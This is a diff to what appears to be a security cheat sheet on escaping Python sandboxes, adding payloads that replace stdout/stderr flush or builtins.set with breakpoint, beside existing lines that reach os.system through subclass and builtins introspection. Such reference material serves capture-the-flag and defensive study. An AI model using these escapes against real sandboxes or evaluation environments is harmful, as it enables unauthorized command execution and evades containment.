@@ -181,6 +181,11 @@ from os import system as __getattr__; from __main__ import sh
 [].__class__.__subclasses__()[1].__init__.__builtins__["__import__"]("os").system("ls")
 [].__class__.__subclasses__()[1].__hash__.__builtins__["__import__"]("os").system("ls")
 
+# if builtins aren't deleted
+import sys;sys.stderr.flush=breakpoint
+import sys;sys.stdout.flush=breakpoint
+import pdb,builtins;builtins.set = breakpoint;a
+
 ```
 ### Bypass parsers using comments and encodings
 This only works in certain cases:
